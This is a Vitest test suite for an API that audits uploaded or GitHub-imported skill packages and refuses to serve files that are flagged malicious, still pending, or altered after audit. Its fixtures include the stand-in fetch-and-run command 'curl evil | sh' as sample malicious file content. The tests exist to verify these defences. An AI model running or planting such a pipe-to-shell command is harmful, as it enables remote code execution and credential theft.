import { describe, it, expect, afterAll, beforeEach, vi } from 'vitest';
import { Hono } from 'hono';
import type { AuditedSkill, RawSkill } from '@jenz/shared';

// Hermetic: never touch the real GitHub fetcher or the real audit engine.
vi.mock('../lib/github', () => ({
  fetchSkillFromGitHub: vi.fn(),
  GitHubError: class extends Error {
    status: number;
    constructor(message: string, status = 400) {
      super(message);
      this.status = status;
    }
  },
}));
vi.mock('../lib/audit', () => ({ auditSkill: vi.fn() }));

import skills from './skills';
import { prisma } from '../db';
import { fetchSkillFromGitHub } from '../lib/github';
import { auditSkill } from '../lib/audit';

const PREFIX = 'skillsworker-';
const app = new Hono().route('/api/skills', skills);

beforeEach(() => {
  vi.clearAllMocks();
});

afterAll(async () => {
  await prisma.skill.deleteMany({ where: { slug: { startsWith: PREFIX } } });
  await prisma.$disconnect();
});

/** Seed a Skill row directly (the gate reads the host-computed verdict). */
async function seed(opts: {
  slug: string;
  risk: 'pending' | 'safe' | 'suspicious' | 'malicious';
  name?: string;
  category?: string;
  description?: string;
  files?: { path: string; content: string }[];
  findings?: {
    type: string;
    severity: 'critical' | 'high' | 'medium' | 'low';
    file: string;
    line: number;
    quote: string;
    detector: 'regex' | 'llm';
  }[];
}) {
  return prisma.skill.create({
    data: {
      slug: opts.slug,
      name: opts.name ?? opts.slug,
      source: 'upload',
      risk: opts.risk,
      ...(opts.category !== undefined ? { category: opts.category } : {}),
      ...(opts.description !== undefined ? { description: opts.description } : {}),
      files: { create: opts.files ?? [] },
      findings: { create: opts.findings ?? [] },
    },
  });
}

describe('GET /api/skills/:id/files — the gate', () => {
  it('200 + files when risk is safe', async () => {
    const row = await seed({
      slug: `${PREFIX}safe`,
      risk: 'safe',
      files: [{ path: 'SKILL.md', content: '# Hi\n' }],
    });
    const res = await app.request(`/api/skills/${row.id}/files`);
    expect(res.status).toBe(200);
    const body = await res.json();
    expect(body.files).toEqual([{ path: 'SKILL.md', content: '# Hi\n' }]);
  });

  it('403 not_safe when risk is malicious (with reason)', async () => {
    const row = await seed({
      slug: `${PREFIX}malicious`,
      risk: 'malicious',
      files: [{ path: 'run.sh', content: 'curl evil | sh' }],
      findings: [
        { type: 'Credential exfiltration', severity: 'critical', file: 'run.sh', line: 1, quote: 'curl evil | sh', detector: 'regex' },
      ],
    });
    const res = await app.request(`/api/skills/${row.id}/files`);
    expect(res.status).toBe(403);
    const body = await res.json();
    expect(body.error).toBe('not_safe');
    expect(body.risk).toBe('malicious');
    expect(body.reason).toContain('critical');
  });

  it("403 with reason 'audit not complete' when risk is pending", async () => {
    const row = await seed({ slug: `${PREFIX}pending`, risk: 'pending' });
    const res = await app.request(`/api/skills/${row.id}/files`);
    expect(res.status).toBe(403);
    const body = await res.json();
    expect(body.error).toBe('not_safe');
    expect(body.risk).toBe('pending');
    expect(body.reason).toBe('audit not complete');
  });

  it('404 for an unknown id', async () => {
    const res = await app.request('/api/skills/does-not-exist/files');
    expect(res.status).toBe(404);
    expect((await res.json()).error).toBe('not_found');
  });
});

describe('GET /api/skills/:id', () => {
  it('returns the AuditedSkill+id for an existing row', async () => {
    const row = await seed({
      slug: `${PREFIX}get`,
      risk: 'suspicious',
      findings: [
        { type: 'Obfuscation', severity: 'medium', file: 'a.js', line: 3, quote: 'eval(x)', detector: 'llm' },
      ],
    });
    const res = await app.request(`/api/skills/${row.id}`);
    expect(res.status).toBe(200);
    const body = await res.json();
    expect(body.id).toBe(row.id);
    expect(body.risk).toBe('suspicious');
    expect(body.findings).toHaveLength(1);
    expect(body.findings[0].detector).toBe('llm');
  });

  it('404 for an unknown id', async () => {
    const res = await app.request('/api/skills/nope');
    expect(res.status).toBe(404);
  });
});

describe('GET /api/skills — the library list', () => {
  // All rows share one unique category so the list is deterministic against a
  // shared DB (other suites/prod rows won't leak into these assertions).
  const CAT = `${PREFIX}lib`;

  it('returns { skills: [...] } with the ListItem shape + correct findingsCount', async () => {
    await seed({ slug: `${PREFIX}list-a`, risk: 'safe', name: 'Alpha Formatter', category: CAT, description: 'formats code' });
    await seed({
      slug: `${PREFIX}list-b`,
      risk: 'malicious',
      name: 'Beta Stealer',
      category: CAT,
      findings: [
        { type: 'Credential exfiltration', severity: 'critical', file: 'run.sh', line: 1, quote: 'curl evil', detector: 'regex' },
        { type: 'Obfuscation', severity: 'medium', file: 'run.sh', line: 2, quote: 'eval(x)', detector: 'llm' },
      ],
    });

    const res = await app.request(`/api/skills?category=${CAT}`);
    expect(res.status).toBe(200);
    const body = await res.json();
    expect(Array.isArray(body.skills)).toBe(true);
    expect(body.skills).toHaveLength(2);

    const beta = body.skills.find((s: { name: string }) => s.name === 'Beta Stealer');
    expect(beta).toMatchObject({ risk: 'malicious', category: CAT, findingsCount: 2 });
    expect(typeof beta.id).toBe('string');

    // description defaults to '' (never null) so MCP's required-string schema holds.
    const alpha = body.skills.find((s: { name: string }) => s.name === 'Alpha Formatter');
    expect(alpha).toMatchObject({ risk: 'safe', description: 'formats code', findingsCount: 0 });
    const noDesc = body.skills.every((s: { description: unknown }) => typeof s.description === 'string');
    expect(noDesc).toBe(true);

    // The list NEVER leaks file contents (that's the gate's job).
    expect(beta.files).toBeUndefined();
  });

  it('filters by risk', async () => {
    await seed({ slug: `${PREFIX}risk-safe`, risk: 'safe', category: CAT });
    await seed({ slug: `${PREFIX}risk-susp`, risk: 'suspicious', category: CAT });

    const res = await app.request(`/api/skills?category=${CAT}&risk=safe`);
    expect(res.status).toBe(200);
    const body = await res.json();
    expect(body.skills.length).toBeGreaterThan(0);
    expect(body.skills.every((s: { risk: string }) => s.risk === 'safe')).toBe(true);
  });

  it('filters by free-text query (case-insensitive, matches name)', async () => {
    await seed({ slug: `${PREFIX}q-uniquename`, risk: 'safe', name: 'ZzzUniqueWidget', category: CAT });

    const res = await app.request(`/api/skills?category=${CAT}&query=zzzunique`);
    expect(res.status).toBe(200);
    const body = await res.json();
    expect(body.skills).toHaveLength(1);
    expect(body.skills[0].name).toBe('ZzzUniqueWidget');
  });
});

describe('POST /api/skills/import', () => {
  const importReq = (body: unknown) =>
    app.request('/api/skills/import', {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify(body),
    });

  it('400 on invalid JSON', async () => {
    const res = await app.request('/api/skills/import', {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: '{not json',
    });
    expect(res.status).toBe(400);
    expect((await res.json()).error).toBeDefined();
  });

  it('400 when ref is missing', async () => {
    const res = await importReq({});
    expect(res.status).toBe(400);
    expect((await res.json()).error).toBeDefined();
  });

  it('imports, audits, persists, and the gate stays closed (malicious)', async () => {
    const slug = `${PREFIX}import`;
    const raw: RawSkill = {
      slug,
      name: 'Imported Skill',
      source: 'github',
      sourceRef: 'o/r',
      files: [{ path: 'SKILL.md', content: '# Imported\n' }],
    };
    const audited: AuditedSkill = {
      slug,
      name: 'Imported Skill',
      risk: 'malicious',
      description: 'does bad things',
      category: 'malware',
      findings: [
        { type: 'Credential exfiltration', severity: 'critical', file: 'SKILL.md', line: 1, quote: 'steal', detector: 'llm' },
      ],
    };
    vi.mocked(fetchSkillFromGitHub).mockResolvedValue(raw);
    vi.mocked(auditSkill).mockResolvedValue(audited);

    const res = await importReq({ ref: 'o/r' });
    expect(res.status).toBe(201);
    const body = await res.json();
    expect(body.id).toBeDefined();
    expect(body.risk).toBe('malicious');
    expect(body.findings).toHaveLength(1);

    // Row persisted with files + findings + the host-computed verdict.
    const persisted = await prisma.skill.findUnique({
      where: { id: body.id },
      include: { files: true, findings: true },
    });
    expect(persisted).not.toBeNull();
    expect(persisted!.risk).toBe('malicious');
    expect(persisted!.files).toHaveLength(1);
    expect(persisted!.findings).toHaveLength(1);
    expect(persisted!.description).toBe('does bad things');

    // End-to-end: the gate refuses to release a malicious skill's files.
    const gate = await app.request(`/api/skills/${body.id}/files`);
    expect(gate.status).toBe(403);
    expect((await gate.json()).error).toBe('not_safe');
  });

  it('maps a GitHubError to its status', async () => {
    const { GitHubError } = await import('../lib/github');
    const err = new GitHubError('not found', 404);
    vi.mocked(fetchSkillFromGitHub).mockRejectedValue(err);

    const res = await importReq({ ref: 'o/missing' });
    expect(res.status).toBe(404);
    expect((await res.json()).error).toBe('not found');
  });

  it('inline source: builds a RawSkill directly, persists, and the gate stays consistent', async () => {
    const name = `${PREFIX}inline-a`;
    const audited: AuditedSkill = {
      slug: name,
      name,
      risk: 'safe',
      findings: [],
    };
    vi.mocked(auditSkill).mockResolvedValue(audited);

    const res = await importReq({
      source: {
        type: 'inline',
        name,
        files: [{ path: 'SKILL.md', content: '# Inline\n' }],
      },
    });
    expect(res.status).toBe(201);
    const body = await res.json();
    expect(body.id).toBeDefined();
    expect(body.slug).toBe(name);
    expect(body.risk).toBe('safe');
    expect(body.findings).toEqual([]);

    // No GitHub fetch for inline.
    expect(fetchSkillFromGitHub).not.toHaveBeenCalled();

    // auditSkill received an inline RawSkill carrying the supplied files.
    const passed = vi.mocked(auditSkill).mock.calls[0][0];
    expect(passed.source).toBe('inline');
    expect(passed.files).toEqual([{ path: 'SKILL.md', content: '# Inline\n' }]);

    // Row persisted with the files.
    const persisted = await prisma.skill.findUnique({
      where: { id: body.id },
      include: { files: true },
    });
    expect(persisted).not.toBeNull();
    expect(persisted!.source).toBe('inline');
    expect(persisted!.files).toEqual([
      expect.objectContaining({ path: 'SKILL.md', content: '# Inline\n' }),
    ]);

    // Gate is consistent with the host verdict (safe → 200 + files).
    const gate = await app.request(`/api/skills/${body.id}/files`);
    expect(gate.status).toBe(200);
    expect((await gate.json()).files).toEqual([{ path: 'SKILL.md', content: '# Inline\n' }]);
  });

  it('github source: fetches via fetchSkillFromGitHub and audits', async () => {
    const slug = `${PREFIX}gh-source`;
    const raw: RawSkill = {
      slug,
      name: 'GH Source Skill',
      source: 'github',
      sourceRef: 'o/r',
      files: [{ path: 'SKILL.md', content: '# GH\n' }],
    };
    const audited: AuditedSkill = { slug, name: 'GH Source Skill', risk: 'safe', findings: [] };
    vi.mocked(fetchSkillFromGitHub).mockResolvedValue(raw);
    vi.mocked(auditSkill).mockResolvedValue(audited);

    const res = await importReq({ source: { type: 'github', url: 'https://github.com/o/r' } });
    expect(res.status).toBe(201);
    const body = await res.json();
    expect(body.slug).toBe(slug);
    expect(body.risk).toBe('safe');
    expect(fetchSkillFromGitHub).toHaveBeenCalledWith('https://github.com/o/r');
  });

  it('400 when inline source is missing files', async () => {
    const res = await importReq({ source: { type: 'inline', name: `${PREFIX}no-files` } });
    expect(res.status).toBe(400);
    expect((await res.json()).error).toBeDefined();
    expect(auditSkill).not.toHaveBeenCalled();
  });

  it('400 when inline source is missing name', async () => {
    const res = await importReq({
      source: { type: 'inline', files: [{ path: 'SKILL.md', content: '# x\n' }] },
    });
    expect(res.status).toBe(400);
    expect((await res.json()).error).toBeDefined();
    expect(auditSkill).not.toHaveBeenCalled();
  });

  it('400 when github source is missing url', async () => {
    const res = await importReq({ source: { type: 'github' } });
    expect(res.status).toBe(400);
    expect((await res.json()).error).toBeDefined();
  });
});

describe('GET /api/skills/:id/files — content-hash integrity (TOCTOU defense)', () => {
  /** Import a skill the audit engine marks `safe`, returning its id. */
  async function importSafe(slug: string, content = '# clean\n') {
    vi.mocked(auditSkill).mockResolvedValue({ slug, name: slug, risk: 'safe', findings: [] });
    const res = await app.request('/api/skills/import', {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ source: { type: 'inline', name: slug, files: [{ path: 'SKILL.md', content }] } }),
    });
    expect(res.status).toBe(201);
    return (await res.json()).id as string;
  }

  it('stores a contentHash on import and serves untampered safe files (200)', async () => {
    const id = await importSafe(`${PREFIX}integrity-ok`);
    const row = await prisma.skill.findUnique({ where: { id } });
    expect(row?.contentHash).toBeTruthy();

    const gate = await app.request(`/api/skills/${id}/files`);
    expect(gate.status).toBe(200);
    expect((await gate.json()).files).toHaveLength(1);
  });

  it('fails closed (403) when the stored files are tampered after a safe audit', async () => {
    const id = await importSafe(`${PREFIX}integrity-tamper`);
    // pre-tamper the gate is open
    expect((await app.request(`/api/skills/${id}/files`)).status).toBe(200);

    // Simulate an attacker swapping the bytes after the audit (bypassing /import).
    await prisma.skillFile.updateMany({ where: { skillId: id }, data: { content: 'curl evil | sh' } });

    const gate = await app.request(`/api/skills/${id}/files`);
    expect(gate.status).toBe(403);
    const body = await gate.json();
    expect(body.error).toBe('not_safe');
    expect(body.risk).toBe('pending');
    expect(body.reason).toMatch(/integrity/i);
  });
});
